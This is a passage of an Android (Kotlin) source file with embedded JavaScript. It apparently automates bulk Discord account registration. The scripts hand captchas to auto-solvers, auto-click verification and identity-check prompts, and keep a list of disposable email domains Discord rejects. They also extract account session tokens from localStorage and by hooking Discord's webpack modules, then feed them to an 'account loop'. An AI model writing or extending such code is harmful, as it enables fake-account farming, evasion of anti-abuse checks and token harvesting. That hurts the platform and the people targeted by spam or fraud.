      document.querySelectorAll('iframe[src*="hcaptcha"],iframe[src*="newassets.hcaptcha"]').forEach(function(f) {
        try {
          f.style.opacity = '1';
          f.style.visibility = 'visible';
          f.style.display = 'block';
          if (f.parentElement) { f.parentElement.style.opacity = '1'; f.parentElement.style.visibility = 'visible'; }
        } catch(e) {}
      });
    } catch(e) {}
    var labels = ['Create Account','Continue','Verify','Submit','Next'];
    var clicked = false;
    document.querySelectorAll('button, div[role="button"], a').forEach(function(b) {
      if (clicked) return;
      var tx = (b.innerText || b.textContent || '').trim();
      if (labels.indexOf(tx) >= 0 && b.offsetParent !== null) {
        try { b.click(); clicked = true; } catch(e) {}
      }
    });
    try { Android.onLog('Captcha inject follow-up click=' + clicked, 'INFO'); } catch(e) {}
  }, 400);
  setTimeout(function() { window.__captchaInjectLock = false; }, 2500);
""".trimIndent()
    }

    companion object {
        /** Domains Discord rejects hard — never hand to register form. */
        val HARD_BANNED_MAIL_DOMAINS = setOf(
            "uberip.com",
            "guerrillamailblock.com",
            "guerrillamailblock.org"
        )

        private const val CHECK_URL_JS = """
(function() {
  var isToken = function(t) { return t&&typeof t==='string'&&t.length>50&&t.split('.').length===3; };
  try {
    var t = window.localStorage.getItem('token');
    if (t) { t=t.replace(/"/g,''); if(isToken(t)){Android.onTokenFound(t);} }
  } catch(e){}
})();
        """

        private const val VERIFY_STEP_JS = """
(function() {
  var href = window.location.href;
  var onChannels = href.includes('channels/@me') || href.includes('%40me') || href.includes('/channels/');
  var onVerify = href.includes('discord.com/verify');
  var hasCaptcha = !!document.querySelector('iframe[src*="hcaptcha.com"]') || !!document.querySelector('iframe[src*="recaptcha"]');
  var stepDone = onChannels || onVerify || !hasCaptcha;
  Android.onStepVerified(stepDone);
})();
        """

        /**
         * Injected when manual captcha mode starts or after an auto-solver injects a token.
         * Watches the page using a fast polling loop + MutationObserver to detect:
         *  (a) real login state (URL + guilds sidebar / avatar / Discord app mount)
         *  (b) captcha solution by iframe disappearance or textarea value
         *  (c) any Continue/Next/Verify/Submit button and auto-clicks it (with retries)
         *  (d) "Verify by Email" / identity verification prompts
         * When login is detected, extracts the token and calls Android.onCaptchaAutoSolved()
         * so the native side hides the CONTINUE button and resumes the account loop.
         * Stops itself after 15 minutes.
         */
        private const val CAPTCHA_WATCH_JS = """
(function() {
  if (window.__captchaWatchActive) return;
  window.__captchaWatchActive = true;

  // If an auto-solver already injected the token and clicked submit, skip straight
  // to watching for the next step (verify-by-email / lingering Continue / success)
  // instead of re-detecting and re-submitting the captcha response.
  var submitted = !!window.__captchaSubmittedExternally;
  window.__captchaSubmittedExternally = false;

  var verifyEmailClicked = false;
  var lastAutoClickText = '';
  var autoClickAttempts = 0;
  var ticks = 0;
  var isToken = function(t) { return t && typeof t === 'string' && t.length > 50 && t.split('.').length === 3; };

  function isLoggedIn() {
    var href = window.location.href || '';
    // Strict: must be on an actual channels URL. Do NOT use app-mount/sidebar —
    // those exist on register/login and caused false 'auto-detected login' resumes.
    var onChannels = /\/channels\/(\d+|@me|%40me)/.test(href) || href.indexOf('%40me') >= 0;
    if (!onChannels) return false;
    // Optional extra confidence: guild nav or avatar present
    return true;
  }

  function hasCaptcha() {
    return !!(
      document.querySelector('iframe[src*="hcaptcha.com"]') ||
      document.querySelector('iframe[src*="recaptcha"]') ||
      document.querySelector('iframe[src*="arkoselabs.com"]') ||
      document.querySelector('iframe[src*="funcaptcha"]') ||
      document.querySelector('#h-captcha') ||
      document.querySelector('.h-captcha') ||
      document.querySelector('.g-recaptcha') ||
      document.querySelector('[class*="captcha"]') ||
      document.querySelector('[data-captcha]')
    );
  }

  function findEnabledButton(textMatchers) {
    var all = document.querySelectorAll('button,div[role="button"],a[role="button"]');
    for (var i = 0; i < all.length; i++) {
      var el = all[i];
      if (el.disabled || el.getAttribute('aria-disabled') === 'true') continue;
      var t = (el.textContent || '').toLowerCase().trim();
      if (!t) continue;
      for (var m = 0; m < textMatchers.length; m++) {
        if (t.includes(textMatchers[m])) return { el: el, text: t };
      }
    }
    return null;
  }

  function clickButton(matchers, reason) {
    var b = findEnabledButton(matchers);
    if (b) {
      b.el.click();
      Android.onLog('Auto-clicked "' + b.text + '" button (' + reason + ')', 'SUCCESS');
      return true;
    }
    return false;
  }

  function tryExtractToken() {
    try {
      var tok = window.localStorage.getItem('token');
      if (tok) { tok = tok.replace(/"/g, ''); if (isToken(tok)) { Android.onTokenFound(tok); return true; } }
    } catch(e) {}
    try {
      var m = [];
      var chunk = window.webpackChunkdiscord_app || [];
      chunk.push([['x'], {}, function(e) { for (var c in e.c) m.push(e.c[c]); }]);
      var auth = m.find(function(x) {
        return x && x.exports && x.exports.default && x.exports.default.getToken && isToken(x.exports.default.getToken());
      });
      if (auth) { Android.onTokenFound(auth.exports.default.getToken()); return true; }
    } catch(e) {}
    return false;
  }

  function onLoggedIn() {
    clearInterval(t);
    window.__captchaWatchActive = false;
    tryExtractToken();
    Android.onLog('✓ Logged in after captcha — auto-resuming', 'SUCCESS');
    Android.onCaptchaAutoSolved();
  }

  var t = setInterval(function() {
    ticks++;
    if (ticks > 1800) { clearInterval(t); window.__captchaWatchActive = false; return; } // 15 min

    var href = window.location.href || '';

    // ── Success: real Discord app loaded ────────────────────────────────────
    if (isLoggedIn()) {
      onLoggedIn();
      return;
    }

    // ── Captcha response detection & auto-submit (if not already submitted) ─
    if (!submitted) {
      try {
        var resp = '';
        var names = ['h-captcha-response','g-recaptcha-response','fc-captcha-response','arkose-captcha-response'];
        for (var n = 0; n < names.length; n++) {
          var ta = document.querySelector('textarea[name="'+names[n]+'"]');
          if (ta && ta.value && ta.value.length > 20) { resp = ta.value; break; }
        }
        if (!resp && typeof hcaptcha !== 'undefined' && hcaptcha.getResponse) resp = hcaptcha.getResponse() || '';
        if (!resp && typeof grecaptcha !== 'undefined' && grecaptcha.getResponse) resp = grecaptcha.getResponse() || '';
        if (!resp) {
          // Captcha disappeared without us seeing a response — consider it solved
          if (!hasCaptcha() && ticks > 4) { submitted = true; Android.onLog('Captcha no longer visible — treating as solved', 'INFO'); }
        }
        if (resp) {
          submitted = true;
          Android.onLog('✓ Captcha response detected — auto-submitting', 'SUCCESS');
          setTimeout(function() {
            if (!clickButton(['submit','verify','continue','confirm','next','create','log in','login'], 'captcha solve')) {
              Android.onLog('⚠ No submit button found after captcha solve', 'WARNING');
              submitted = false; // allow retry
            }
          }, 500);
        }
      } catch(e) {}
    }

    // ── Identity verification prompt after captcha ──────────────────────────
    if (submitted && !verifyEmailClicked) {
      try {
        var pageText = (document.body && document.body.innerText) || '';
        if (/verification required|confirm your identity|verify your account|new login|verify.*email|suspicious activity|account stays secure/i.test(pageText)) {
          if (clickButton(['email','verify by email','send to email','send email'], 'verify-by-email')) {
            verifyEmailClicked = true;
            Android.onIdentityVerificationRequired();
          }
        }
      } catch(e) {}
    }

    // ── Auto-click any standalone Continue/Next/Verify/Submit button ────────
    // Retry with a short cooldown so transient disabled states get retried.
    if (submitted && autoClickAttempts < 10) {
      try {
        var pageText = (document.body && document.body.innerText) || '';
        if (/continue|next|verify|confirm|proceed|submit|finish|done|let\s+go/i.test(pageText)) {
          var b = findEnabledButton(['continue','next','verify','confirm','proceed','submit','finish','done','let\'s go','i agree']);
          if (b && b.text !== lastAutoClickText) {
            lastAutoClickText = b.text;
            autoClickAttempts++;
            b.el.click();
            Android.onLog('Auto-clicked "' + b.text + '" button to keep flow moving', 'SUCCESS');
          }
        }
      } catch(e) {}
    }
  }, 500);

  // Also use MutationObserver to catch page changes that happen between ticks
  try {
    var observer = new MutationObserver(function() {
      if (isLoggedIn() && window.__captchaWatchActive) {
        onLoggedIn();
        observer.disconnect();
      }
    });
    observer.observe(document.body || document.documentElement, { childList: true, subtree: true });
  } catch(e) {}
})();
        """

        /**
         * Injected when the user presses CONTINUE or when the captcha watcher wants to auto-resume.
         * Checks the current URL first:
         *  - Already on channels/@me or verify success → extract token immediately and auto-resume
         *  - Any other page         → log "Resuming", reset captcha flag, check localStorage, then auto-resume
         */
        private const val SMART_CONTINUE_JS = """
(function() {
  var href = window.location.href;
  var isToken = function(t) { return t && typeof t === 'string' && t.length > 50 && t.split('.').length === 3; };
  var onChannels = href.includes('channels/@me') || href.includes('/channels/') || href.includes('%40me');

  function extractNow() {
    try {
      var t = window.localStorage.getItem('token');
      if (t) { t = t.replace(/"/g, ''); if (isToken(t)) { Android.onTokenFound(t); return true; } }
    } catch(e) {}
    try {
      var m = [];
      var chunk = window.webpackChunkdiscord_app || [];
      chunk.push([['x'], {}, function(e) { for (var c in e.c) m.push(e.c[c]); }]);
      var auth = m.find(function(x) {
        return x && x.exports && x.exports.default &&
               x.exports.default.getToken && isToken(x.exports.default.getToken());
      });
      if (auth) { Android.onTokenFound(auth.exports.default.getToken()); return true; }
    } catch(e) {}
    return false;
  }

  function tryResume() {
    if (extractNow()) {
      Android.onLog('Token found — auto-resuming', 'SUCCESS');
      Android.onCaptchaAutoSolved();
      return;
    }
    // If we are on a success page but token not in localStorage yet, give it a moment
    if (onChannels) {
      setTimeout(function() {
        if (extractNow()) {
          Android.onLog('Token found after delay — auto-resuming', 'SUCCESS');
          Android.onCaptchaAutoSolved();
        } else {
          Android.onLog('Already logged in, token extraction pending — auto-resuming anyway', 'SUCCESS');
          Android.onCaptchaAutoSolved();
        }
      }, 1500);
      return;
    }
    // Email / phone verify pages mean login already happened — do not claim "not logged in"
    var body = (document.body && document.body.innerText) || '';
    if (/verify.*email|check your email|confirm your email|phone number|verify your phone/i.test(body) || href.includes('verify')) {
      Android.onLog('Post-login verification page — continuing', 'SUCCESS');
      try { Android.onCaptchaAutoSolved(); } catch(e) {}
      return;
    }
    Android.onLog('Resuming — waiting for login state…', 'INFO');
    window.__captchaReported = false;
  }

  if (onChannels) {
    Android.onLog('Already logged in — extracting token...', 'SUCCESS');
    tryResume();
  } else {
    Android.onLog('Resuming — checking login state...', 'INFO');
    window.__captchaReported = false;
    tryResume();
  }
})();
        """

        /**
         * Polls the Discord email-verification page for captcha and login success.
         * Triggers the native auto-solvers via onCaptchaDetected when a captcha appears,
         * auto-clicks any Continue/Verify/Submit button, and auto-resumes when Discord
         * redirects to channels/@me.
         */
        private const val VERIFY_PAGE_WATCH_JS = """
(function() {
  if (window.__verifyPageWatch) return;
  window.__verifyPageWatch = true;

  var isToken = function(t) { return t && typeof t === 'string' && t.length > 50 && t.split('.').length === 3; };
  var reported = false;
  var ticks = 0;

  function findCaptcha() {
    var hc = document.querySelector('iframe[src*="hcaptcha.com"]');
    if (hc) {
      var sm = hc.src && hc.src.match(/sitekey=([^&]+)/);
      return sm ? sm[1] : (document.querySelector('[data-sitekey]') && document.querySelector('[data-sitekey]').getAttribute('data-sitekey')) || 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
    }
    var rc = document.querySelector('iframe[src*="recaptcha"], iframe[src*="google.com/recaptcha"]');
    if (rc) {
      var sm2 = rc.src && rc.src.match(/k=([^&]+)/);
      return sm2 ? sm2[1] : '6Ldt3-oZAAAAAI7q8-9Jk7c4L_qx-gT8_9V1h8cZ';
    }
    var widget = document.querySelector('[data-sitekey]');
    if (widget) return widget.getAttribute('data-sitekey') || 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
    var cls = document.querySelector('.h-captcha, .g-recaptcha, [class*="captcha"], [id*="captcha"]');
    if (cls) return 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
    return null;
  }

  function hasCaptcha() { return !!findCaptcha(); }

  function isLoggedIn() {
    var href = window.location.href || '';
    return /\/channels\/(\d+|@me|%40me)/.test(href) || href.includes('%40me');
  }

  function clickButton(matchers) {
    var all = document.querySelectorAll('button, div[role="button"]');
    for (var i = 0; i < all.length; i++) {
      var el = all[i];
      if (el.disabled || el.getAttribute('aria-disabled') === 'true') continue;
      var t = (el.textContent || '').toLowerCase().trim();
      for (var m = 0; m < matchers.length; m++) {
        if (t.includes(matchers[m])) { el.click(); return t; }
      }
    }
    return null;
  }

  function tryExtractToken() {
    try {
      var t = window.localStorage.getItem('token');
      if (t) { t = t.replace(/"/g, ''); if (isToken(t)) { Android.onTokenFound(t); return true; } }
    } catch(e) {}
    return false;
  }

  var t = setInterval(function() {
    ticks++;
    if (ticks > 1800) { clearInterval(t); window.__verifyPageWatch = false; return; } // 30 min

    if (isLoggedIn()) {
      clearInterval(t);
      window.__verifyPageWatch = false;
      tryExtractToken();
      Android.onLog('Email verification complete — logged in', 'SUCCESS');
      Android.onCaptchaAutoSolved();
      return;
    }

    if (!reported) {
      var sk = findCaptcha();
      if (sk) {
        reported = true;
        Android.onLog('Captcha detected on email verification page — sitekey: ' + sk.substring(0, 8) + '...', 'CAPTCHA');
        Android.onCaptchaDetected(sk);
      }
    }

    // Auto-click any Continue/Verify/Submit button once the captcha is solved
    clickButton(['continue', 'verify', 'submit', 'confirm', 'next', 'done']);
  }, 1000);
})();
        """

        private const val LOGOUT_JS = """
(function() {
  try { window.localStorage.clear(); } catch(e) {}
  try { window.sessionStorage.clear(); } catch(e) {}
  try {
    var cookies = document.cookie.split(';');
    for (var i = 0; i < cookies.length; i++) {
      var c = cookies[i];
      var eq = c.indexOf('=');
      var name = eq > -1 ? c.substr(0, eq).trim() : c.trim();
      if (!name) continue;
      document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
      document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=.discord.com';
      document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=discord.com';
    }
  } catch(e) {}
  try {
    if (window.indexedDB && indexedDB.databases) {
      indexedDB.databases().then(function(dbs) {
        (dbs || []).forEach(function(db) {
          try { if (db && db.name) indexedDB.deleteDatabase(db.name); } catch(e2) {}
        });
      });
    }
  } catch(e) {}
  try { window.location.replace('https://discord.com/login'); } catch(e) {
    try { window.location.href = 'https://discord.com/login'; } catch(e3) {}
  }
})();
        """
    }
}
